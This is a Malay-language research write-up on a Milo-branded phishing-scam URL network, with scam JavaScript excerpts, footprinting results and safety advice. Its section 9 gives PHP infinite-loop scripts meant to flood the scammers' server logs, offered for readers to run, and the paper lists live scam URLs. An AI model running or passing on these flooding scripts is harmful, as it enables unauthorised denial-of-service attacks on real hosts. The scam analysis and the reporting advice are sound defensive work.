# Kertas Kajian URL Scammer Milo

Sejak awal bulan Mac 2023 telah viral beberapa kes duit dari akaun bank ditolak secara automatik tanpa disedari kerana telah tertekan atau tidak menekan URL penipuan cabutan bertuah Milo. URL ini bukan sahaja menggunakan jenama Milo, bahkan ada beberapa lagi jenama yang digunakan seperti 7-Eleven, eForm Skim Cepat Kaya dan lain-lain.

Kajian ini dilakukan dengan menggunakan beberapa teknik Footprinting, Fingerprinting dan Reverse Engineering melalui beberapa toolkit seperti Burpsuite, Postman, nmap, nikto, dirb, dnsenum, Mozilla Firefox dan beberapa aplikasi media sosial seperti Facebook Messenger, Instagram dan Telegram.

Secara ringkasnya, terdapat lebih 20 bentuk penipuan didalam satu rangkaian mereka melalui pelbagai jenis URL. Bentuk serangan juga berbeza-beza mengikut jenis perkakasan (device) dan sistem operasi (Operating System) (OS) yang digunakan oleh mangsa.

# 1.0 Objektif Kajian
- Memahami modes operandi teknik penipuan.
- Mengenalpasti tahap berbahaya kepada pengguna.
- Mengenalpasti bentuk struktur sistem penipuan (lebih teknikal).
- Mengenalpasti individu/organisasi disebalik operasi penipuan.
- Mengenalpasti rangkaian penipuan lain yang berkaitan.
- Mencari solusi bagi penyelesaian masalah ini.

# 2.0 Matlamat Kajian
Membongkar dan memberi kesedaran kepada orang awam tentang modes operandi dan penipuan-penipuan yang berkaitan dengannya supaya mangsa atau orang awam dapat berhati-hati dan mengambil langkah yang proaktif dalam meningkatkan keselamatan digital peribadi.

# 3.0 Sumber Maklumat Kes
Memandangkan kes ini diambil secara rambang di media sosial, maka sebahagian besar maklumat pemula (initial information) diambil dari beberapa posting media sosial di Facebook, Komuniti MyOPECS, Instagram, Tweeter dan Tiktok. 

Berikut kami pecahkan tiga kategori dari sumber-sumber ini:

1. Mangsa tidak klik pada URL, tetapi duit dipotong atas nama Facebook.
2. Mangsa klik dan mengikuti langkah dari web itu hingga akhir dan duit dipotong atas nama facebook.
3. Mangsa klik dan mengikuti langkah dari web itu tetapi tiada duit dipotong.

Berdasarkan maklumat yang diterima dari media sosial, sukar bagi kami untuk klasifikasikan bahawa maklumat itu benar atau tidak kerana maklumat ini terkandung maklumat nyata (non-fuzz data) (mangsa itu sendiri) dan maklumat samar (fuzz data) (cerita mulut ke mulut).

## 3.1 URL Scam
Berikut adalah URL utama bagi kajian ini: (Jika dibuka URL ini, risiko ditangan anda sendiri)
http://conclusiveallot.cn/e028WnYFdgV3QmADUl1ccnw2XkB4ZQJkC1dpY1gcIS4OXBkMDVUtHhwJNyZzMzo0FAUdFUMkMnIqL00Kfws7YR5xEQ?ahqv1680157049198

# 4.0 Hipotesis Awal:
Kebanyakkan posting yang menjadi mangsa adalah pengguna Maybank. Mungkin kerana pengguna Maybank adalah lebih ramai dari pengguna bank lain. Duit dipotong melalui Facebook ads itu mungkin topup kepada akaun ads scammer dan cara untuk mendapatkan maklumat perbankan seperti no kad dan sebagainya adalah seperti berikut:

1. Mangsa ini maklumat perbankan untuk menerima duit.
2. Mangsa pernah daftarkan maklumat perbankan dengan Meta Pay.
3. Mangsa aktifkan "auto-fill" di akaun Facebook.
4. Mangsa "install" aplikasi virus.

# 5.0  Struktur Pembangunan
Walaupun terdapat banyak URL yang kami dapati, tetapi bentuk pembangunan mereka adalah sama. Beberapa teknik Reverse Engineering digunakan untuk mendapatkan Javascript code dari URL ini melalui toolkit Burpsuite, Postman dan Mozilla Developer Tools.

Berikut adalah beberapa ciri-ciri pembangunannya:

1. Redirection - Daripada URL yang panjang tadi, ia tidak mempunyai apa-apa kandungan (web content) bahkan ia akan redirect pengguna kepada URL yang lebih pendek seperti `https://ms5hf7.cn/cI8qDsTg/7-eleven-my/?_t=1680757404447`. 

```
<body>
	<script type="text/javascript" charset="utf-8">
		location.href="https://ms5hf7.cn/cI8qDsTg/7-eleven-my/?_t=1680757404447";
	</script>
</body>
```
Rujuk `index.html` line 16.

2. Required HTTP Referer  - Dari URL yang pendek tadi hanya boleh dibuka jika ia redirected dari URL yang panjang. Jika kita refresh pada URL yang pendek (HTTP Referer to none) maka tiada kandungan dipaparkan.

3. JS Script Builder - Laman dari URL pendek tadi secara asasnya adalah kosong. Yang memaparkan segala kandungan penipuan itu adalah dari Javascript yang diambil dari cloud `baidu.com` seperti `https://hm.baidu.com/hm.js?839dce93f29806e5b2c4fc12926e16bc`. Dan dari script ini pula akan include pelbagai URL script yang lain.

```
<body>
	<span>The page does not exist.</span>
	<script>
		var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?839dce93f29806e5b2c4fc12926e16bc";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
	</script>
</body>
```
Rujuk index2.html line 17.

4. Popup Failed - Setiap kali butang (button) "Share Whatsapp" atau "Share Facebook Messenger" ditekan, popup fail ini akan terkeluar pada klik ke-2 dan ke-empat.
```
setTimeout(function () {
	get_Cookie('prog') == '' ? value = 1 : value = parseInt(get_Cookie('prog'));
	if (value >= g_share_step) {
		continueBtn();
	}else{
		value == 2 || value == 4 ? swalert("The same group or the same friend is not correct. Please check and share again.","Sharing failed!") : void (0);
	}
	set_Cookie('prog', value + 1);
	let pType = get_Cookie('pType');
	set_Cookie('pType', pType);
	move()
}, 3000);
```
Rujuk Scam.js line 533.

Mungkin tujuannya untuk menampakkan bahawa aplikasi ini "real" seolah-olah tahu bahawa kita telah berkongsi pada rakan-rakan atau tidak.

5. More Redirect - Pada setiap penamat peraduan, mangsa akan dihantar (redirect) kepada beberapa URL yang lain berbeza-beza mengikut aplikasi dan OS yang digunakan.
```
let jurl = j;
if(platform == 'messenger'){
	jurl = msj;
	location.href = 'fb-messenger://share/?link='+encodeURIComponent(jurl + new Date().getTime());
}else if(platform == 'telegram'){
	jurl = tgj;
	location.href = 'tg://msg_url?url=' + encodeURIComponent(jurl + new Date().getTime());
}else if(platform == 'line'){
	jurl = lnj;
	location.href = 'https://line.me/R/share?text=' + encodeURIComponent(jurl);
}else if(platform == 'viber'){
	jurl = vbj;
	location.href = 'viber://forward?text=' + encodeURIComponent(jurl);
}else{
	if(nptimes.length > 0){
		if(nptimes.includes(share_num)){
			jurl = j2;
		}
	}
	location.href = 'whatsapp://send?text=' + jurl + new Date().getTime();
}
```
Rujuk Scam.js line 511.

6. Redirect other page - URL pada variable `j` itu datang dari Javascript baidu cloud yang lain iaitu dari URL:
```
https://ms5hf7.cn/j/ntb.php?c=7-eleven-my&m=7-eleven-my-m&tg=7-eleven-my&ln=7-eleven-my&vb=7-eleven-my&_t=1680754874449
```
Dari code:
```
// let's go!
$.getScript('/j/ntb.php?c=7-eleven-my&m=7-eleven-my-m&tg=7-eleven-my&ln=7-eleven-my&vb=7-eleven-my&_t=1680754874449');
var share_number = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'));console.log(share_number);
if (share_number > 0) {
    showShare()
    move()
}
```
Rujuk Scam.js line 286.

Melalui URL ini, ia akan generate pelbagai URL scam yang lain yang berbeza-beza setiap kali request. Daripada senarai URL ini kami dapati terdapat lebih 20 URL lain yang mempunyai modes operandi yang sama seperti URL pada kajian ini.

Jika mangsa menggunakan Windows, maka URL ini akan menghantar mangsa ke URL untuk muatturun satu aplikasi yang mana pada kajian kami ianya adalah Trojan Virus. Rujuk folder `trojan` untuk kajian lanjut.

7. PHP Programming - Melalui beberapa teknik footprinting, kami dapati bahawa meraka menggunakan bahasa PHP dan TBS Framework untuk pembangunan website mereka.

```
<br />
<b>Warning</b>: file_get_contents(../'/tbs/en.html): failed to open stream: No such file or directory in
<b>/www/wwwroot/m.cn/tiaotiao/jiemi.php</b> on line <b>83</b><br />
```
Dari sini kita boleh lihat semua website diletakkan dalam folder `/www/wwwroot/<domain name>`.

8. Web ini juga menggunakan `yllix.com` atau dikenali sebagai Advertica, sebuah syarikat publishing iklan untuk menjana duit. 

```
GET /bnr.php?section=General&pub=593174&format=300x50&ga=g HTTP/2
Host: uprimp.com
...
```
Rujuk laporan Burpsuite di `bursuite/uprimp.txt`

# 6.0 Struktur Server
Untuk mendapatkan maklumat server agak sukar kerana kesemua URL menggunakan CloudFlare, maka proses Footprinting & Fingerprinting hanya terhad kepada dnsenum, dirb dan nikto sahaja.

Maklumat pertama yang kami dapati adalah seperti berikut:
1. Server: nginx (berdasarkan paga 404):
`https://ms5hf7.cn/Mq2pRnhC/'/?_t=1680769131382`

2. Programming: PHP (PHP error enumeration - Google Dork: `incontent: .php ms5hf.cn`)

3. WWW Path: `/www/wwwroot/<domain name>` (rujuk no 2)

Carian daripada dnsenum tidak memberansangkan walaupun wordlist berdasarkan 3 dan 4 karakter a-z1-0.

# 7.0 Suspek Sebalik Penipuan
Data dan malumat yang diperoleh agak tidak mencukupi untuk menuduh mana-mana pihak disebalik penipuan ini. Tetapi berdasarakan maklumat yang ada, berikut adalah kesimpula ringkas latar belakang suspek:

1. Suspek adalah Cina:
Berdasarkan code Scam.js line 590, terdapat comment dalam bahasa Cina (simplified non slang).

2. Suspek adalah dari negara China:
Berdasarkan Javascript code yang diambil dari website Baidu.com.

Bagi siasata yang lebih terperinci, maklumat seperti ID pendaftaran Google Tag, Yllix dan Cloudflare boleh digunakan untuk mengesan individu yang sebenar. Hal ini terletak pada pihak berkuasa tempatan dan kerajasam pihak berkuasa luar negara (Interpol).

Id Yllix: 593174
ID Google Tag: G-0C230YDF7G

# 8.0 Langkah Keselamatan
Berdasarkan pemerhatian kami, URL yang asal diatas tidak mempunyai sebarang borang bayaran atau kecurian data dari Facebook tetapi kecurian maklumat ini berlaku selepas proses "Facebook Share" atau "WhatsApp Share". Ada beberapa kemungkinan utama boleh berlaku (mengikut URL yang berbeza-beza):

1. Bawa mangsa untuk muatturun aplikasi virus
2. Mengisi borang penerimaan wang
3. Jika buka URL dari Facebook App, maka borang itu boleh "auto-fill" maklumat perbankan mangsa

Kenyataan bahawa "duit boleh ditolak tanpa klik pada link" ini agak janggal kerana tidak dapat dibuktikan dalam code yang berada dalam URL-URL ini. Kemungkinan lain adalah terdapat aplikasi "SpyWare" yang ter-install dalam device mangsa sendiri.

## Langkah Keselamatan
1. Nyah-aktifkan (deactive) "auto-fill" dari mana-mana Web Browser dan Apps.
2. Pastikan URL yang dipaparkan adalah URL yang biasa digunakan.
3. Elakkan muatturun dan install apa-apa juga aplikasi yang tidak dikenali (atau pastikan muatturun dari Google Playstore dan Apple AppStore sahaja).
4. Pastikan Windows Defender atau lain-lain Anti Virus dipasang di komputer.


# 9.0 Langkah Pro Aktif Serangan
Berdasarkan kajian ringkas ini, tidak banyak serangan yang boleh dilakukan bagi menjatuhkan penipuan ini. Tetapi disini kami nyatakan beberapa langkah yang kita semua boleh lakukan secara beramai-ramai untuk memastikan website mereka ditutup agar tidak tertipu oleh orang lain.

## 9.1 Laporkan pada CloudFlare:
1. Pergi ke URL: https://abuse.cloudflare.com/
2. Pilih "Abuse Type" - "Phishing & Malware"
3. Masukkan maklumat kita
4. Masukkan URL-url penipuan dalam "Evidence URLs" (dapatkan senarai URL dari `urls.txt`)
5. Masukkan keterangan penipuan seperti:
	- this scam stolen money from facebook pay account
	- this site is not a legit content
	- this site contains false contest information
	- this site impersonate othe businesses
	- this site uses fake content and social media post for scam
	- this site spams users with unknown ads
	- this site redirects users to downloading viruses

## 9.2 Spam Attack Access Logs
Secara teorinya setiap request yang dilakukan dari website, server nginx akan menyimpan log yang dikenali sebagai `access_logs`. Mungkin kita boleh bangunkan satu code yang ringkas untuk sentiasa access website tersebut dengan `GET` requestt yang panjang agar log server mereka menjadi file yang besar.

**Proof-of-Concept logic code (in PHP):**
Kami memilih untuk menggunakan URL `https://ms5hf7.cn/j/ntb.php?c=7-eleven-my&m=7-eleven-my-m&tg=7-eleven-my&ln=7-eleven-my&vb=7-eleven-my&_t=1680754874449` URL ini menerima apa-apa sahaja data yang dihantar melalui `GET` method diatas dan data yang dipulangkan "response" tidak terlalu besar. 

```
<?php
//Boleh dibesarkan
$packet = "1234567890abcdefghijklmnopzrstuvwxyz";

//Jumlah lebih kurang 245-300 byte dalam access logs
$url = "https://ms5hf7.cn/j/ntb.php?c=$packet&m=$packet&tg=$packet&ln=$packet&vb=$packet&_t=$packet";

$n = 1;

while(true){
	$res = file_get_contents($url);
	
	if(!$res){
		echo "Terputus pada: " . $n . " serangan";
	}
}
```

Cara run: `php attack-spam.php`

Purata masa untuk setiap satu request adalah 900ms. Jika kita berjaya untuk run code ini tanpa henti selama 1 jam, ini bermakna kita telah spam storage server mereka sebanyak 120Kb bagi setiap satu attacker. Untuk mencapai serangan 1GB, makan memerlukan serangan dilakukan oleh sekurang-kurangnya 800-1000 attacker.

## 9.3 Spam Attack Error Log
Error pula adalah log yang disimpan oleh PHP sendiri jika terdapat sebarang ralat pada coded. Berdasarkan URL yang didapati dari proses Footprinting, ada beberapa URL yang memaparkan PHP error. Antaranya adalah `http://w.batterypropel.cyou/f6a0ZFJBA3dVckIBQmsEXkBxU1ZAWFARDWQGWX0IGV0IDTpDV0l-BxUgMVw8BEkgOkwbF24tSAEpYgNkIA&p='&_wi` yang mana paramater `p` dan `_wi` boleh digunakan untuk spam attack `access_log`.

```
<?php
//Nilainnya dibesarkan kerana parameternya hanya dua
$packet = 	"1234567890abcdefghijklmnopzrstuvwxyz" . 
			"1234567890abcdefghijklmnopzrstuvwxyz" .
			"1234567890abcdefghijklmnopzrstuvwxyz" .
			"1234567890abcdefghijklmnopzrstuvwxyz" .
			"1234567890abcdefghijklmnopzrstuvwxyz";

//Jumlah lebih kurang 500-600 byte dalam access logs
//Jumlah lebih kurang 150 byte dalam error logs
$url = "http://w.batterypropel.cyou/f6a0ZFJBA3dVckIBQmsEXkBxU1ZAWFARDWQGWX0IGV0IDTpDV0l-BxUgMVw8BEkgOkwbF24tSAEpYgNkIA&p=$packet&_wi=$packet";

$n = 1;
while(true){
	$res = file_get_contents($url);
	
	if(!$res){
		echo "Terputus pada: " . $n . " serangan";
	}
}
```
Cara run: `php attack-error-log.php`

Melalui teknik ini, serangan dilakukan kepada 2 logs, access logs dan error logs. Jumlah bagi setiap serangan adalah lingkungan 700byte dan mengambil masa purata 1500ms setiap request. Ini bermakna jika di-run selama satu jam, sebanyak ~170Kb. Untuk mencapai 1GB serangan memerlukan 500-800 attacker.


Walaubagaimanapun, apa-apa pun jenis serangan memerlukan kajian yang lebih mendalam bagi memastikan serangan itu efektif. Tindakan melaporkan kepada CloudFlare adalah yang terbaik Jika anda melalukan serangan pada 9.2 dan 9.3 makan risiko adalah ditangan anda sendiri.


# 10.0 Penutup
Kami merasa amat gusar dan simpati terhadap mangsa kepada penipuan ini. Saya, Mr Hery sebagai penaung MyOPECS menyeru agar semua ahli MyOPECS untuk memberi tumpuan dan hulurkan tangan dalam menangani dan melaporkan URL penipuan ini pada CloudFlare supaya boleh ditutup secepat mungkin.

Sekian dari saya,
Mr Hery
6 April 2023